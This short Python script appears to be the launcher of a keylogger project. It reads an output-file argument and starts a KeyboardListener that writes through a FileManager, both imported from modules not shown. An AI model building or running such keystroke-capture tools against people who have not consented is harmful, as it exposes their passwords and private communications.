import argparse

from models.file_manager import FileManager
from models.keyboard_listener import KeyboardListener


# argument parser
parser = argparse.ArgumentParser()
parser.add_argument("--file", help="File that will be used for writing", type=str)
args = parser.parse_args()

# file manager
if args.file is None:
    file_path = ""
else:
    file_path = args.file

file_manager = FileManager(file_path)

# keylogger
keyboard_listener = KeyboardListener(file_manager)
keyboard_listener.start()
